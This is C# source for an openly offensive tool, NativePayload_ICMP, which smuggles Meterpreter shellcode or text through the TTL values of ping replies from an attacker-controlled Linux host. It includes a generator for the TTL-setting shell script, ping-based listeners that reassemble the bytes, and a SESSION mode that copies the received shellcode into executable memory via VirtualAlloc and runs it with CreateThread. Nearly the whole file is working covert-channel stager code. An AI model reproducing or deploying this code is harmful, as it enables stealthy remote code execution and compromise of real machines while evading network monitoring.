using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Data;
using System.Runtime.InteropServices;

namespace NativePayload_ICMP
{
    class Program
    {
        static string payload = "";
        public static DataTable Hex_Dec_Table;
        static string help = "\n" + "NativePayload_ICMP syntax :" + "\n\n"
          + "Syntax 1-1 : NativePayload_ICMP sh \"ffccab1cd01f0400 ....\" Input your meterpreter payload for create sh file" + "\n"
            + "Syntax 1-2 : NativePayload_ICMP session \"www.xxx.yyy.zzz\" Target system IPv4 Address for Send Ping Request .... Getting Meterpreter Session with Ping via TTL Values" + "\n"
            + "Syntax 2-1 : NativePayload_ICMP shtext \"your unicode text....\" Input your DATA/TEXT payload for create sh Script file" + "\n"
            + "Syntax 2-2 : NativePayload_ICMP listen \"www.xxx.yyy.zzz\" Target system IPv4 Address for Send Ping Request .... Dumping DATA/TEXT payload via TTL Values" + "\n"            
            + "Syntax 3 : NativePayload_ICMP help" + "\n\n";

        static void Main(string[] args)
        {
            try
            {
                Hex_Dec_Table = new DataTable();

                Hex_Dec_Table.Columns.Add("Dec", typeof(int));
                Hex_Dec_Table.Columns.Add("Hex", typeof(string));

                for (int i = 0; i <= 15; i++)
                {
                    if (i <= 9)
                    {
                        Hex_Dec_Table.Rows.Add(i, i.ToString());
                    }
                    else if (i >= 10)
                    {
                        switch (i)
                        {
                            case 10:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "a");
                                }
                                break;
                            case 11:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "b");
                                }
                                break;
                            case 12:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "c");
                                }
                                break;
                            case 13:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "d");
                                }
                                break;
                            case 14:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "e");
                                }
                                break;
                            case 15:
                                {
                                    Hex_Dec_Table.Rows.Add(i, "f");
                                }
                                break;
                                // default:
                        }
                    }
                }
                if (args[0].ToUpper() == "HELP")
                {
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Using ICMPv4 (ping) to Dump Payloads by TTL response ;)");
                    Console.WriteLine();
                    Console.WriteLine(help);
                }           
                else if (args[0].ToUpper() == "SH" || args[0].ToUpper() == "SHTEXT")
                {
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Using ICMPv4 (ping) to Dump Payloads by TTL response ;)");
                    Console.WriteLine();
                    if (args.Length == 2)
                    {
                        if (args[0].ToUpper() == "SH")
                        {
                            payload = args[1];
                        }
                        if(args[0].ToUpper() == "SHTEXT")
                        {
                            try
                            {                               
                                byte[] Xbytes = ASCIIEncoding.ASCII.GetBytes(args[1]);                               
                                foreach (var item in Xbytes)
                                {
                                    payload += item.ToString("x2");
                                }                                
                            }
                            catch (Exception e)
                            {
                                Console.Write(e.Message);
                            }
                        }
                    }
                    string ff = "";
                    string lastone = "";
                    string TempPayload = "";
                    for (int i = 0; i < payload.Length;)
                    {
                        if (i != payload.Length)
                        {
                            ff = payload.Substring(i, 1);
                            string ss = _HextoDecimal(ff);
                            // debug only
                            //Console.WriteLine(ff + "  " + ss);
                            ///Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + ss + " ; " + "sleep 1 ;");
                            if (lastone != ss)
                            {
                                lastone = ss;
                                //Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + ss + " ; " + "sleep 2 ; \n");
                                TempPayload += ss.Substring(0, ss.Length - 1);
                            }
                            else
                            {
                                //Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + "255" + " ; " + "sleep 1 ; \n");
                                //Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + ss + " ; " + "sleep 2 ; \n");
                                TempPayload += "255" + ss.Substring(0, ss.Length - 1);
                            }
                            //Console.Write("\n sudo sysctl net.ipv4.ip_default_ttl=" + "255" + " ; " + "sleep 1 ; \n");
                            //Console.WriteLine();
                            i++;
                        }
                    }

                    StringBuilder Mycode = new StringBuilder();
                    Mycode.AppendLine(" #!/bin/sh \n");
                    Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=254;\r");
                    Mycode.AppendLine("sleep 5;");
                    Mycode.AppendLine("TtlPayload=\"" + TempPayload + "\";");
                    Mycode.AppendLine("                    for pay in `echo $TtlPayload | xxd -p -c 3`");
                    Mycode.AppendLine("                              do ");
                    Mycode.AppendLine("                                 str=`echo $pay | xxd -r -p`");
                    Mycode.AppendLine("                                 if [ \"$str\" != $'' ];");
                    Mycode.AppendLine("                                 then ");
                    Mycode.AppendLine("                                 echo \"sudo sysctl net.ipv4.ip_default_ttl=\"$str \"; sleep 2;\"");
                    Mycode.AppendLine("                                 sudo sysctl net.ipv4.ip_default_ttl=$str; sleep 2;");
                    Mycode.AppendLine("                                 fi");
                    Mycode.AppendLine("                              done");
                    if (args[0].ToUpper() == "SHTEXT")
                    {
                        for (int i = 0; i < 5 - args[1].Length % 5; i++)
                        {
                            if (args[1].Length % 5 == 0) break;
                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
                            Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
                        }

                        Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255; sleep 3;");
                        Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=100; sleep 3;");
                    }

                    Mycode.AppendLine("sudo sysctl net.ipv4.ip_default_ttl=255;");
                    Mycode.AppendLine("echo \"Done.\";");                    
                   
                    Console.WriteLine("\n[!] File script.sh Created : \n");
                    Console.WriteLine(Mycode.ToString());
                    try
                    {
                        using (System.IO.FileStream Fs = new System.IO.FileStream("script.sh", System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))
                        {
                            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(Fs))
                            {
                                sw.WriteLine(Mycode.ToString().Replace("\r", string.Empty));
                            }
                        }
                    }
                    catch (Exception omg)
                    {
                        Console.WriteLine(omg.Message);
                    }
                }
                else if (args[0].ToUpper() == "LISTEN")
                {
                    bool flag_end = false;
                    bool init = false;
                    int flag_end_count = 0;
                    int Payload_counter = 0;
                    string temp = "";
                    string start_time, end_time = "";
                    start_time = DateTime.Now.ToString();
                    string Oonaggi = "";
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018");
                    Console.ForegroundColor = ConsoleColor.Gray;                   
                    Console.WriteLine("Using ICMPv4 (ping) to Dump Payloads by TTL response ;)");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] Listening Mode");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine();
                    bool isDublicate = false;
                    string Last_ttl_str = "";
                    string TestStr = "";
                    int Timer_Time_Show_Bytes = 0;
                    int two = 0;
                    string String_two_Bytes = "";
                    byte[] String_from_Bytes = new byte[5];
                    Console.WriteLine("{0} Dumping These Bytes: ", DateTime.Now.ToString());
                    String_two_Bytes = "";
                    while (true)
                    {
                        if (flag_end) break;
                        //// ping and send ICMP Traffic to attacker linux system to Dump payloads via TTL response ;)
                        string getcode = _Ping(args[1], 1);
                        try
                        {
                            getcode = getcode.Remove(getcode.Length - 1, 1);
                        }
                        catch (Exception e1)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("e1 : " + e1.Message);
                            Console.WriteLine();
                            Console.WriteLine("Error : it is not good  ;( ");
                            Console.WriteLine("Please run this tool again");
                            Console.WriteLine("after running this tool Please again run your ./script.sh in linux ;)");
                            Console.ForegroundColor = ConsoleColor.Gray;
                            break;
                        }

                        if (getcode == "254") { init = true; }
                        if (getcode == "255")
                        {
                            isDublicate = true;
                            Last_ttl_str = getcode;
                        }
                        if (getcode != "255")
                        {
                            Last_ttl_str = getcode;
                            flag_end_count = 0;
                          
                            if (getcode != temp && getcode != "255" && getcode != "253")
                            {
                                if (init && getcode != "254")
                                {
                                    if (Timer_Time_Show_Bytes == 10)
                                    {
                                        Console.ForegroundColor = ConsoleColor.DarkCyan;
                                        int kk = 0;
                                        for (int i = 0; i < 5;)
                                        {
                                            String_from_Bytes[i] = byte.Parse(String_two_Bytes.Substring(kk, 2), System.Globalization.NumberStyles.HexNumber);
                                            kk++;
                                            kk++;
                                            i++;
                                        }

                                        Console.Write("  ==> " + ASCIIEncoding.ASCII.GetString(String_from_Bytes));
                                        Timer_Time_Show_Bytes = 0;
                                        String_two_Bytes = "";
                                        Console.WriteLine();
                                    }
                                    
                                    Console.ForegroundColor = ConsoleColor.Cyan;
                                    TestStr = getcode.Substring(getcode.Length - 2, 2);
                                    string Text = "";
                                    for (int j = 0; j <= 15; j++)
                                    {
                                        if (Convert.ToInt32(Hex_Dec_Table.Rows[j].ItemArray[0]) == Convert.ToInt32(TestStr))
                                        {
                                    
                                            Text = (Hex_Dec_Table.Rows[j].ItemArray[1].ToString());
                                            break;
                                        }
                                    }
                                    
                                    Console.Write("{0}", Text);
                                    String_two_Bytes += Text;
                                    
                                    Payload_counter++;
                                    Timer_Time_Show_Bytes++;
                                    two++;                                                                                                                                                                                   
                                }
                                else if (init == false)
                                {
                                    //  Console.ForegroundColor = ConsoleColor.DarkGreen;
                                   // Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
                                }
                            }
                            else if (getcode == temp && getcode != "255")
                            {
                              //  Console.ForegroundColor = ConsoleColor.DarkGreen;
                             //   Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
                            }

                            System.Threading.Thread.Sleep(1000);
                            temp = getcode;
                        }
                        else if (getcode == "255")
                        {
                            flag_end_count++;
                            Console.ForegroundColor = ConsoleColor.Gray;
                            // Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);

                            System.Threading.Thread.Sleep(500);
                            temp = getcode;
                            if (flag_end_count >= 10)
                            {
                                flag_end = true;
                                Console.ForegroundColor = ConsoleColor.Gray;
                                Console.WriteLine();
                                Console.WriteLine("{0} Dumping Payloads Done.",DateTime.Now.ToString());
                            }
                        }
                    }
                }
                else if (args[0].ToUpper() == "SESSION")
                {
                    bool flag_end = false;
                    bool init = false;
                    int flag_end_count = 0;
                    int Payload_counter = 0;
                    string temp = "";
                    string start_time, end_time = "";
                    start_time = DateTime.Now.ToString();
                    string Oonaggi = "";                          
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("NativePaylaod_ICMPv4 v2.0 , Published by Damon Mohammadbagher , 2017-2018");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Using ICMPv4 (ping) to Dump Payloads by TTL response ;)");
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] Meterpreter Session Mode");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine();
                    bool isDublicate = false;
                    string Last_ttl_str = "";
                    while (true)
                    {
                        if (flag_end) break;
                        //// ping and sending ICMP Traffic to attacker linux system to Dump payloads by TTL response ;)
                        string getcode = _Ping(args[1], 1);
                        try
                        {
                            getcode = getcode.Remove(getcode.Length - 1, 1);
                        }
                        catch (Exception e1)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("e1 : " + e1.Message);
                            Console.WriteLine();
                            Console.WriteLine("Error : it is not good  ;( ");
                            Console.WriteLine("Please run this tool again");
                            Console.WriteLine("after running this tool Please again run your ./script.sh in linux ;)");
                            Console.ForegroundColor = ConsoleColor.Gray;
                            break;
                        }

                        if (getcode == "254") { init = true; }
                        if (getcode == "255")
                        {
                            isDublicate = true;
                            Last_ttl_str = getcode;
                        }
                        if (getcode != "255")
                        {
                            Last_ttl_str = getcode;
                            flag_end_count = 0;
                            if (getcode != temp && getcode != "255" && getcode != "253")
                            {
                                if (init && getcode != "254")
                                {
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.Write("{0} , Dump:{1},", DateTime.Now.ToString(), Payload_counter.ToString());
                                    Console.ForegroundColor = ConsoleColor.Cyan;
                                    //string dd = _HextoDecimal(getcode.Substring(1, 2));
                                    Console.Write(" DATA[{0}] ", getcode.Substring(getcode.Length - 2, 2));
                                    Oonaggi += getcode.Substring(getcode.Length - 2, 2);
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine("from {0} final: {1}", args[1], getcode);
                                    Payload_counter++;
                                }
                                else if (init == false)
                                {
                                    Console.ForegroundColor = ConsoleColor.DarkGreen;
                                    Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
                                }
                            }
                            else if (getcode == temp && getcode != "255")
                            {
                                Console.ForegroundColor = ConsoleColor.DarkGreen;
                                Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);
                            }

                            System.Threading.Thread.Sleep(1000);
                            temp = getcode;
                        }
                        else if (getcode == "255")
                        {
                            flag_end_count++;
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.WriteLine("{0} , {1} Find DATA from {2} final: {3}", DateTime.Now.ToString(), Payload_counter.ToString(), args[1], getcode);

                            System.Threading.Thread.Sleep(500);
                            temp = getcode;
                            if (flag_end_count >= 10) { flag_end = true; }
                        }
                    }

                    end_time = DateTime.Now.ToString();

                    Console.WriteLine(end_time + " , Done ");

                    byte[] __Bytes = new byte[Oonaggi.Length / 4];
                    int payload_dec_count = Oonaggi.Length / 4;
                    int tmp_counter = 0;
                    string current = null;
                    int _0_to_2_ = 0;
                    for (int d = 0; d < payload_dec_count;)
                    {
                        string tmp1_current = (Oonaggi.Substring(tmp_counter, 2));

                        for (int j = 0; j <= 15; j++)
                        {
                            if (Convert.ToInt32(Hex_Dec_Table.Rows[j].ItemArray[0]) == Convert.ToInt32(tmp1_current))
                            {
                                _0_to_2_++;

                                current += (Hex_Dec_Table.Rows[j].ItemArray[1].ToString());

                                if (_0_to_2_ == 2)
                                {
                                    Console.Write(current + " ");
                                    __Bytes[d] = Convert.ToByte(current, 16);
                                    _0_to_2_ = 0;
                                    d++;
                                    current = null;
                                }
                            }
                        }

                        tmp_counter++;
                        tmp_counter++;

                    }
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine("Bingo Meterpreter session by ICMPv4 traffic ;)");
                    UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);
                    IntPtr hThread = IntPtr.Zero;
                    UInt32 threadId = 0;
                    IntPtr pinfo = IntPtr.Zero;

                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);

                }
            }
            catch (Exception _main)
            {
                Console.WriteLine("Main Error: {0}", _main.Message);
                Console.WriteLine("Main Error: Please use help , NativePayload_ICMP help", _main.Message);
            }
        }


        static Dictionary<char, int> HexDic = new Dictionary<char, int>
        {
             //// {'0',200},{'1',201},{'2',202},{'3',203},{'4',204},{'5',205},{'6',206},{'7',207},{'8',208}
             //// ,{'9',209},{'a',210},{'b',211},{'c',212},{'d',213},{'e',214},{'f',215}

             {'0',100},{'1',101},{'2',102},{'3',103},{'4',104},{'5',105},{'6',106},{'7',107},{'8',108}
            ,{'9',109},{'a',110},{'b',111},{'c',112},{'d',113},{'e',114},{'f',115}
        };

        static string _HextoDecimal(string hexstring)
        {

            string result = "";
            hexstring = hexstring.ToLower();
            for (int i = 0; i < hexstring.Length; i++)
            {
                char Oonagii = hexstring[hexstring.Length - 1 - i];
                result += (HexDic[Oonagii] * (int)Math.Pow(16, i)).ToString() + " ";
            }
            return result;
        }


        static string _Ping(string IPAddress_DNSName, int counter)
        {
            string Final_Dec = "";

            try
            {
               
                if (counter != 1) { counter = 1; }

                /// Make DNS traffic for getting Meterpreter Payloads by nslookup
                ProcessStartInfo ns_Prcs_info = new ProcessStartInfo("ping.exe", IPAddress_DNSName + " -n " + counter.ToString());
                ns_Prcs_info.RedirectStandardInput = true;
                ns_Prcs_info.RedirectStandardOutput = true;
                ns_Prcs_info.UseShellExecute = false;


                Process nslookup = new Process();
                nslookup.StartInfo = ns_Prcs_info;
                nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                nslookup.Start();

                //string result_Line0 = "";
                string Pingoutput = nslookup.StandardOutput.ReadToEnd();
                string[] All_lines = Pingoutput.Split('\t', '\n');

                //int PayloadLines_current_id = 0;
                foreach (var item in All_lines)
                {
                    if (item.StartsWith("Reply "))
                    {
                        Final_Dec = item.Substring(item.Length - 4);
                    }
                    // debug
                    // Console.WriteLine(item + "\n"+ s);  
                }

            }
            catch (Exception e)
            {

                Console.WriteLine(e.Message);
            }
            return Final_Dec;
        }

        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
